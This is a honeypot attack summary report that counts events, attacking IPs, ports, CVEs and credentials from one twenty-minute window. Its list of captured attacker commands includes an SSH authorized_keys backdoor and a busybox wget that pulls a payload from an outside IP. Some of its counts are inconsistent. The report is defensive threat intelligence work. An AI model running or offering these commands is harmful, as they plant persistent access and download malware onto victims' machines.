Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T15:01:52Z
**Timeframe:** 2025-09-29 from 14:40 to 15:00 (approximated from filenames)
**Files Used:**
- agg_log_20250929T144001Z.json
- agg_log_20250929T145634Z.json
- agg_log_20250929T150001Z.json

**Executive Summary**

This report summarizes 7,641 events collected from our honeypot network. The majority of attacks were captured by the Cowrie honeypot, with a significant number of events also recorded by Honeytrap, Ciscoasa, and Suricata. The most frequent attacks originated from the IP address 39.107.106.103. The most targeted port was TCP/22 (SSH). A number of CVEs were targeted, with CVE-2021-44228 (Log4Shell) being the most prominent.

**Detailed Analysis**

*   **Our IPs:**
    *   *No data available in logs.*

*   **Attacks by Honeypot:**
    *   Cowrie: 2777
    *   Honeytrap: 1891
    *   Ciscoasa: 1440
    *   Suricata: 1258
    *   Dionaea: 67
    *   Tanner: 48
    *   ConPot: 32
    *   Mailoney: 30
    *   Sentrypeer: 22
    *   H0neytr4p: 19
    *   Adbhoney: 15
    *   ElasticPot: 15
    *   Redishoneypot: 15
    *   Honeyaml: 12

*   **Top Source Countries:**
    *   *No data available in logs.*

*   **Top Attacking IPs:**
    *   39.107.106.103: 1270
    *   185.156.73.166: 374
    *   185.156.73.167: 374
    *   103.140.249.62: 368
    *   92.63.197.55: 355
    *   209.141.43.77: 343
    *   92.63.197.59: 334
    *   85.209.134.43: 331
    *   172.245.163.134: 94
    *   3.131.215.38: 75
    *   129.13.189.204: 64
    *   118.26.37.105: 40
    *   80.75.212.83: 56
    *   193.32.162.157: 52
    *   188.246.224.87: 46

*   **Top Targeted Ports/Protocols:**
    *   22 (SSH): 429
    *   8333 (Bitcoin): 108
    *   80 (HTTP): 51
    *   TCP/5432 (PostgreSQL): 19
    *   8728 (MikroTik): 32
    *   25 (SMTP): 24
    *   9090: 28
    *   8001: 30
    *   9443: 25

*   **Most Common CVEs:**
    *   CVE-2021-44228
    *   CVE-2021-3449
    *   CVE-2002-0013
    *   CVE-2002-0012
    *   CVE-1999-0517
    *   CVE-2019-11500
    *   CVE-2016-20016
    *   CVE-2006-2369

*   **Commands Attempted by Attackers:**
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `uname -a`
    *   `whoami`
    *   `lscpu | grep Model`
    *   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
    *   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/...`
    *   `Enter new UNIX password:`

*   **Signatures Triggered:**
    *   *No data available in logs.*

*   **Users / Login Attempts:**
    *   345gs5662d34/345gs5662d34
    *   minecraft/server
    *   ww/ww123
    *   root/Warlock1
    *   test/zhbjETuyMffoL8F
    *   oguz/oguz
    *   github/github1234
    *   jramirez/jramirez123
    *   sa/
    *   loren/loren

*   **Files Uploaded/Downloaded:**
    *   *No data available in logs.*

*   **HTTP User-Agents:**
    *   *No data available in logs.*

*   **SSH Clients and Servers:**
    *   *No data available in logs.*

*   **Top Attacker AS Organizations:**
    *   *No data available in logs.*

**Key Observations and Anomalies**

*   **Repetitive SSH Commands:** A large number of commands are focused on accessing and modifying the `.ssh` directory, particularly `authorized_keys`. This indicates a common tactic of attempting to gain persistent access.
*   **Botnet Activity:** The long `wget` and `curl` command string observed is characteristic of botnet activity, attempting to download and execute malicious binaries for different architectures (ARM, x86, MIPS).
*   **Credential Stuffing:** The variety of usernames and passwords suggests widespread credential stuffing attempts.

This concludes the Honeypot Attack Summary Report.